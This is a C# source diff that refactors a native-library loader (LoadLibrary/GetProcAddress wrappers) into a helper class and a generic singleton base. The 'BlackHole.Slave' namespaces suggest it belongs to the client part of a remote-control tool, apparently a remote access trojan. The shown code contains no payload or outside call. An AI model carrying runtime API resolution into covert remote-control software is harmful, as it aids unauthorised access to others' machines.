@@ -1,4 +1,5 @@
-﻿using Microsoft.Win32.SafeHandles;
+﻿using BlackHole.Common;
+using Microsoft.Win32.SafeHandles;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -8,9 +9,19 @@ using System.Security.Permissions;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace BlackHole.Slave.Helper
+namespace BlackHole.Slave.Helper.Native
 {
-    public sealed class DynamicNativeLibrary : IDisposable
+    /// <summary>
+    /// 
+    /// </summary>
+    [SecurityPermission(SecurityAction.LinkDemand, UnmanagedCode = true)]
+    public sealed class SafeLibraryHandle : SafeHandleZeroOrMinusOneIsInvalid
+    {
+        private SafeLibraryHandle() : base(true) { }
+        protected override bool ReleaseHandle() => DynamicNativeLibraryHelper.FreeLibrary(handle);
+    }
+
+    public static class DynamicNativeLibraryHelper
     {
         public const string KERNEL_LIBRARY = "kernel32";
         [DllImport(KERNEL_LIBRARY, CharSet = CharSet.Auto, BestFitMapping = false, SetLastError = true)]
@@ -23,17 +34,11 @@ namespace BlackHole.Slave.Helper
 
         [DllImport(KERNEL_LIBRARY)]
         public static extern IntPtr GetProcAddress(SafeLibraryHandle module, string procName);
+    }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        [SecurityPermission(SecurityAction.LinkDemand, UnmanagedCode = true)]
-        public sealed class SafeLibraryHandle : SafeHandleZeroOrMinusOneIsInvalid
-        {
-            private SafeLibraryHandle() : base(true) { }
-            protected override bool ReleaseHandle() => FreeLibrary(handle);
-        }
-        
+    public class DynamicNativeLibrary<T> : Singleton<T>, IDisposable
+        where T : DynamicNativeLibrary<T>, new()
+    {
         /// <summary>
         /// 
         /// </summary>
@@ -45,7 +50,7 @@ namespace BlackHole.Slave.Helper
         /// <param name="fileName"></param>
         public DynamicNativeLibrary(string fileName)
         {
-            m_libraryHandle = LoadLibrary(fileName);
+            m_libraryHandle = DynamicNativeLibraryHelper.LoadLibrary(fileName);
             if (m_libraryHandle.IsInvalid)            
                 Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());            
         }
@@ -58,7 +63,7 @@ namespace BlackHole.Slave.Helper
         /// <returns></returns>
         public T FindUmanagedFunction<T>(string functionName) where T : class
         {
-            var ptr = GetProcAddress(m_libraryHandle, functionName);
+            var ptr = DynamicNativeLibraryHelper.GetProcAddress(m_libraryHandle, functionName);
             
             if (ptr == IntPtr.Zero)            
                 return null;
